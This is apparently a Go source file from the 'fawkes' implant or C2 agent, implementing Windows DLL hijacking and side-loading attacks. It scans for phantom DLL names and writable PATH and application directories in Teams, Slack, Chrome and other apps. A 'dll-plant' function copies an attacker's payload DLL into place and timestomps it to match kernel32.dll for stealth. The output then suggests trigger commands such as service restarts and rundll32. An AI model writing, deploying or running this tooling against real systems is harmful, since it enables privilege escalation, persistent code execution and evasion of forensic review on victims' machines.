//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// winPrivescCheckDLLHijack scans for DLL search order hijacking opportunities
func winPrivescCheckDLLHijack() structs.CommandResult {
	var sb strings.Builder

	// Phase 1: Enumerate writable directories in the standard DLL search order
	sb.WriteString("DLL Search Order (standard, SafeDllSearchMode enabled):\n")
	sb.WriteString("  1. Application directory\n")
	sb.WriteString("  2. System directory (C:\\Windows\\System32)\n")
	sb.WriteString("  3. 16-bit system directory (C:\\Windows\\System)\n")
	sb.WriteString("  4. Windows directory (C:\\Windows)\n")
	sb.WriteString("  5. Current directory\n")
	sb.WriteString("  6. PATH directories\n\n")

	// Check SafeDllSearchMode registry setting
	safeDLL := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager`, "SafeDllSearchMode")
	if safeDLL == 0 {
		sb.WriteString("[!!] SafeDllSearchMode is DISABLED — current directory is searched before system directories!\n")
		sb.WriteString("     This significantly increases DLL hijacking risk\n\n")
	} else {
		sb.WriteString("[*] SafeDllSearchMode is enabled (default)\n\n")
	}

	// Check CWDIllegalInDllSearch (blocks loading from CWD)
	cwdBlock := readRegDWORD(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager`, "CWDIllegalInDllSearch")
	if cwdBlock != 0 && cwdBlock != 0xFFFFFFFF {
		sb.WriteString(fmt.Sprintf("[*] CWDIllegalInDllSearch = %d (some CWD DLL loading blocked)\n\n", cwdBlock))
	}

	// Phase 2: Known phantom DLLs (DLLs commonly searched for but not present)
	sb.WriteString("--- Known Phantom DLL Targets ---\n")
	sb.WriteString("These DLLs are commonly loaded by Windows applications but may not exist.\n")
	sb.WriteString("Placing a malicious DLL with this name in a writable search path hijacks execution.\n\n")

	phantomDLLs := []struct {
		dll     string
		loader  string
		service bool
	}{
		{"wlbsctrl.dll", "IKEEXT service (if running)", true},
		{"wbemcomn.dll", "Various WMI providers", true},
		{"fveapi.dll", "BitLocker operations", false},
		{"CRYPTSP.dll", "Crypto service operations", true},
		{"Tsmsisrv.dll", "Remote Desktop Session Host", true},
		{"TSVIPSrv.dll", "Remote Desktop IP Virtualization", true},
		{"profapi.dll", "User profile service", true},
		{"dhcpcsvc.dll", "DHCP client", true},
		{"fxsst.dll", "Fax service", true},
		{"WTSAPI32.dll", "Terminal Services API (some apps)", false},
		{"ualapi.dll", "User Access Logging service", true},
		{"msfte.dll", "Search Indexer", true},
		{"dxgi.dll", "DirectX Graphics (specific app versions)", false},
		{"version.dll", "Common phantom in app directories", false},
		{"userenv.dll", "User environment (specific contexts)", false},
	}

	systemRoot := os.Getenv("SystemRoot")
	if systemRoot == "" {
		systemRoot = `C:\Windows`
	}

	for _, phantom := range phantomDLLs {
		// Check if the DLL exists in System32 (if not, it's a hijack candidate)
		sys32Path := filepath.Join(systemRoot, "System32", phantom.dll)
		exists := true
		if _, err := os.Stat(sys32Path); err != nil {
			exists = false
		}

		if !exists {
			svcNote := ""
			if phantom.service {
				svcNote = " [service context]"
			}
			sb.WriteString(fmt.Sprintf("  [!] %s — NOT in System32 — loaded by: %s%s\n", phantom.dll, phantom.loader, svcNote))
		}
	}

	// Phase 3: Writable directories in PATH where DLLs could be planted
	sb.WriteString("\n--- Writable PATH Directories (DLL planting targets) ---\n")
	pathEnv := os.Getenv("PATH")
	pathDirs := strings.Split(pathEnv, ";")

	var writableDirs []string
	for _, dir := range pathDirs {
		dir = strings.TrimSpace(dir)
		if dir == "" {
			continue
		}
		if isDirWritable(dir) {
			writableDirs = append(writableDirs, dir)
		}
	}

	if len(writableDirs) > 0 {
		for _, d := range writableDirs {
			sb.WriteString(fmt.Sprintf("  [!] %s (WRITABLE)\n", d))
		}
		sb.WriteString(fmt.Sprintf("\n[!!] %d writable PATH directories — plant a DLL with a phantom name here\n", len(writableDirs)))
		sb.WriteString("     When a service or privileged app searches PATH for the DLL, your DLL loads first\n")
	} else {
		sb.WriteString("  (no writable directories in PATH)\n")
	}

	// Phase 4: Check KnownDLLs (DLLs that bypass search order — cannot be hijacked)
	sb.WriteString("\n--- KnownDLLs (protected from hijacking) ---\n")
	// Count known DLLs by reading the registry key value count
	knownDLLCount := countRegValues(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)
	if knownDLLCount >= 0 {
		sb.WriteString(fmt.Sprintf("  %d DLLs in KnownDLLs registry (these CANNOT be hijacked)\n", knownDLLCount))
	} else {
		sb.WriteString("  (could not read KnownDLLs registry key)\n")
	}

	return successResult(sb.String())
}

// winPrivescCheckDLLSideLoad checks for DLL side-loading opportunities (T1574.002).
// Side-loading exploits the fact that many legitimate applications load DLLs from their
// own directory without verification. If the application directory is writable, an attacker
// can plant a malicious DLL that gets loaded when the application starts.
func winPrivescCheckDLLSideLoad() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== DLL Side-Loading Check (T1574.002) ===\n\n")

	// Known side-loading targets: legitimate apps that load specific DLLs from their own directory
	type sideloadTarget struct {
		app     string // Application name
		dll     string // DLL that gets side-loaded
		paths   []string // Possible installation paths
		context string // Execution context (user, service, etc.)
	}

	programFiles := os.Getenv("ProgramFiles")
	programFilesX86 := os.Getenv("ProgramFiles(x86)")
	localAppData := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")

	targets := []sideloadTarget{
		{"Microsoft Teams", "CRYPTSP.dll", []string{
			filepath.Join(localAppData, "Microsoft", "Teams"),
			filepath.Join(localAppData, "Microsoft", "Teams", "current"),
		}, "user"},
		{"Microsoft OneDrive", "version.dll", []string{
			filepath.Join(localAppData, "Microsoft", "OneDrive"),
		}, "user/service"},
		{"Slack", "WINMM.dll", []string{
			filepath.Join(localAppData, "slack"),
		}, "user"},
		{"Discord", "WINMM.dll", []string{
			filepath.Join(localAppData, "Discord"),
		}, "user"},
		{"Visual Studio Code", "WINMM.dll", []string{
			filepath.Join(localAppData, "Programs", "Microsoft VS Code"),
		}, "user"},
		{"Zoom", "version.dll", []string{
			filepath.Join(appData, "Zoom", "bin"),
		}, "user"},
		{"Google Chrome", "chrome_elf.dll", []string{
			filepath.Join(programFiles, "Google", "Chrome", "Application"),
			filepath.Join(programFilesX86, "Google", "Chrome", "Application"),
		}, "user"},
		{"Microsoft Edge", "msedge_elf.dll", []string{
			filepath.Join(programFiles, "Microsoft", "Edge", "Application"),
			filepath.Join(programFilesX86, "Microsoft", "Edge", "Application"),
		}, "user"},
		{"Adobe Reader", "Acrobat.dll", []string{
			filepath.Join(programFiles, "Adobe", "Acrobat DC", "Acrobat"),
			filepath.Join(programFilesX86, "Adobe", "Acrobat Reader DC", "Reader"),
		}, "user"},
		{"7-Zip", "7z.dll", []string{
			filepath.Join(programFiles, "7-Zip"),
			filepath.Join(programFilesX86, "7-Zip"),
		}, "user"},
		{"Notepad++", "SciLexer.dll", []string{
			filepath.Join(programFiles, "Notepad++"),
			filepath.Join(programFilesX86, "Notepad++"),
		}, "user"},
		{"WinSCP", "DragExt.dll", []string{
			filepath.Join(programFiles, "WinSCP"),
			filepath.Join(programFilesX86, "WinSCP"),
		}, "user"},
		{"PuTTY", "WINMM.dll", []string{
			filepath.Join(programFiles, "PuTTY"),
			filepath.Join(programFilesX86, "PuTTY"),
		}, "user"},
	}

	var vulnerable []string
	var installed []string

	for _, t := range targets {
		for _, p := range t.paths {
			if p == "" {
				continue
			}
			info, err := os.Stat(p)
			if err != nil || !info.IsDir() {
				continue
			}
			installed = append(installed, fmt.Sprintf("  [*] %s — %s", t.app, p))

			// Check if the directory is writable
			if isDirWritable(p) {
				vulnerable = append(vulnerable, fmt.Sprintf("  [!!] %s — %s\n       Side-load: %s (context: %s)\n       Directory is WRITABLE — plant %s here to execute code when %s launches",
					t.app, p, t.dll, t.context, t.dll, t.app))
				break // Only report once per app
			}
			break // Only check first existing path per app
		}
	}

	sb.WriteString(fmt.Sprintf("Scanned %d known side-loading targets\n", len(targets)))
	sb.WriteString(fmt.Sprintf("Installed: %d, Vulnerable: %d\n\n", len(installed), len(vulnerable)))

	if len(vulnerable) > 0 {
		sb.WriteString("--- VULNERABLE Side-Loading Targets ---\n")
		sb.WriteString(strings.Join(vulnerable, "\n\n"))
		sb.WriteString("\n\n[!!] Plant a DLL with the target name in the writable directory.\n")
		sb.WriteString("     When the application starts, it loads YOUR DLL from its own directory.\n")
		sb.WriteString("     Use 'dll-plant' action to copy and timestomp the DLL.\n")
	} else if len(installed) > 0 {
		sb.WriteString("--- Installed Applications (directories not writable) ---\n")
		sb.WriteString(strings.Join(installed, "\n"))
		sb.WriteString("\n\n[*] No writable application directories found. Side-loading not possible with current permissions.\n")
	} else {
		sb.WriteString("[*] No known side-loading target applications found on this system.\n")
	}

	return successResult(sb.String())
}

// winDLLPlant places a DLL in a target directory for DLL search order hijacking (T1574.001).
// The operator uploads a Fawkes DLL payload to the target first, then uses this action
// to copy it with the correct phantom DLL name into a writable PATH directory.
func winDLLPlant(args privescCheckArgs) structs.CommandResult {
	if args.Source == "" {
		return errorResult("Error: 'source' is required — path to the DLL file on target (upload it first)")
	}
	if args.TargetDir == "" {
		return errorResult("Error: 'target_dir' is required — writable directory to plant the DLL in (use dll-hijack to find)")
	}
	if args.DLLName == "" {
		return errorResult("Error: 'dll_name' is required — name for the planted DLL (e.g. 'fveapi.dll')")
	}

	// Ensure DLL name has .dll extension
	dllName := args.DLLName
	if !strings.HasSuffix(strings.ToLower(dllName), ".dll") {
		dllName += ".dll"
	}

	// Resolve paths
	srcPath, err := filepath.Abs(args.Source)
	if err != nil {
		return errorf("Error resolving source path: %v", err)
	}
	targetDir, err := filepath.Abs(args.TargetDir)
	if err != nil {
		return errorf("Error resolving target directory: %v", err)
	}

	// Validate source exists and is readable
	srcInfo, err := os.Stat(srcPath)
	if err != nil {
		return errorf("Source DLL not found: %v. Upload the DLL to the target first.", err)
	}
	if srcInfo.IsDir() {
		return errorResult("Error: source path is a directory, not a file")
	}

	// Validate target directory exists
	dirInfo, err := os.Stat(targetDir)
	if err != nil {
		return errorf("Target directory not found: %v", err)
	}
	if !dirInfo.IsDir() {
		return errorResult("Error: target_dir is not a directory")
	}

	// Check write access
	if !isDirWritable(targetDir) {
		return errorf("Error: target directory '%s' is not writable", targetDir)
	}

	destPath := filepath.Join(targetDir, dllName)

	// Check if target already exists
	if existInfo, err := os.Stat(destPath); err == nil {
		return errorf("Warning: '%s' already exists (%s, %s). Remove it first or choose a different name.",
			destPath, formatFileSize(existInfo.Size()), existInfo.ModTime().Format("2006-01-02 15:04:05"))
	}

	// Check against KnownDLLs — these cannot be hijacked
	systemRoot := os.Getenv("SystemRoot")
	if systemRoot == "" {
		systemRoot = `C:\Windows`
	}
	sys32Path := filepath.Join(systemRoot, "System32", dllName)
	if _, err := os.Stat(sys32Path); err == nil {
		// DLL exists in System32 — check if it's in KnownDLLs
		knownDLLCount := countRegValues(windows.HKEY_LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)
		if knownDLLCount > 0 {
			// Read each value to check if our DLL is protected
			var knownKey windows.Handle
			knownPath, _ := windows.UTF16PtrFromString(`SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)
			if windows.RegOpenKeyEx(windows.HKEY_LOCAL_MACHINE, knownPath, 0, windows.KEY_READ, &knownKey) == nil {
				defer windows.RegCloseKey(knownKey)
				for i := uint32(0); i < uint32(knownDLLCount); i++ {
					var valName [256]uint16
					valNameLen := uint32(len(valName))
					var data [512]byte
					dataLen := uint32(len(data))
					var dataType uint32
					procRegEnumValue := windows.NewLazySystemDLL("advapi32.dll").NewProc("RegEnumValueW")
					r1, _, _ := procRegEnumValue.Call(
						uintptr(knownKey),
						uintptr(i),
						uintptr(unsafe.Pointer(&valName[0])),
						uintptr(unsafe.Pointer(&valNameLen)),
						0,
						uintptr(unsafe.Pointer(&dataType)),
						uintptr(unsafe.Pointer(&data[0])),
						uintptr(unsafe.Pointer(&dataLen)),
					)
					if r1 != 0 {
						break
					}
					knownDLL := windows.UTF16ToString((*[256]uint16)(unsafe.Pointer(&data[0]))[:dataLen/2])
					if strings.EqualFold(knownDLL, dllName) {
						return errorf("Error: '%s' is in the KnownDLLs registry — Windows loads it directly from System32, bypassing search order. This DLL cannot be hijacked.", dllName)
					}
				}
			}
		}
	}

	// Copy the DLL
	srcData, err := os.ReadFile(srcPath)
	if err != nil {
		return errorf("Error reading source DLL: %v", err)
	}

	if err := os.WriteFile(destPath, srcData, 0644); err != nil {
		return errorf("Error writing DLL to target: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] DLL planted successfully\n"))
	sb.WriteString(fmt.Sprintf("    Source:  %s (%s)\n", srcPath, formatFileSize(srcInfo.Size())))
	sb.WriteString(fmt.Sprintf("    Target:  %s\n", destPath))

	// Timestomp: match kernel32.dll modification time for stealth
	doTimestomp := args.Timestomp == nil || *args.Timestomp // default true
	if doTimestomp {
		refPath := filepath.Join(systemRoot, "System32", "kernel32.dll")
		if refInfo, refErr := os.Stat(refPath); refErr == nil {
			refTime := refInfo.ModTime()
			if tsErr := os.Chtimes(destPath, refTime, refTime); tsErr == nil {
				sb.WriteString(fmt.Sprintf("    Timestomp: matched kernel32.dll (%s)\n", refTime.Format("2006-01-02 15:04:05")))
			} else {
				sb.WriteString(fmt.Sprintf("    Timestomp: failed (%v)\n", tsErr))
			}
		}
	}

	// Provide trigger guidance
	sb.WriteString("\n--- Trigger Guidance ---\n")
	sb.WriteString("The planted DLL will be loaded when a process searches for it via DLL search order.\n")
	sb.WriteString("Common triggers:\n")
	sb.WriteString("  1. Service restart:  sc stop <ServiceName> && sc start <ServiceName>\n")
	sb.WriteString("  2. Application launch: Run any app that loads this DLL from PATH\n")
	sb.WriteString("  3. System reboot: Services that load the DLL will pick it up on next boot\n")
	sb.WriteString("  4. LOLBin load:  rundll32 " + destPath + ",Run\n")
	sb.WriteString("\nCleanup: securedelete " + destPath + "\n")

	return successResult(sb.String())
}
